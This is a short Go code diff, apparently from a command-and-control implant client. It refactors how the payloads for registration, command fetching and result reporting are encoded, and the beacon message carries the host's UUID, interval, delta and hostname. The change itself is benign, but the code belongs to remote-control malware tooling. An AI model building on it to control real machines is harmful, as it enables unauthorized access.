@@ -10,14 +10,14 @@ import (
 // GenGetComPL generates the payload used to "get commands"
 func GenGetComPL(m Metclient) string {
 	uid := fetchUUID(m)
-	compayload := EncodePayload(uid, "D", "0", m.magicstring, m.magictermstr)
+	compayload := EncodePayload(uid, "D", "0", m)
 	return compayload
 }
 
 // genResPL generates the payload used to "send results"
 func genResPL(res []string, m Metclient) string {
 	resStr := strings.Join(res, "<||>")
-	respayload := EncodePayload(resStr, "E", "0", m.magicstring, m.magictermstr)
+	respayload := EncodePayload(resStr, "E", "0", m)
 	return respayload
 }
 
@@ -29,6 +29,6 @@ func genRegPL(m Metclient) string {
 	intrv := strconv.Itoa(m.interval)
 	dlt := strconv.Itoa(m.delta)
 	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
-	ep := EncodePayload(payload, "C", "0", m.magicstring, m.magictermstr)
+	ep := EncodePayload(payload, "C", "0", m)
 	return ep
 }
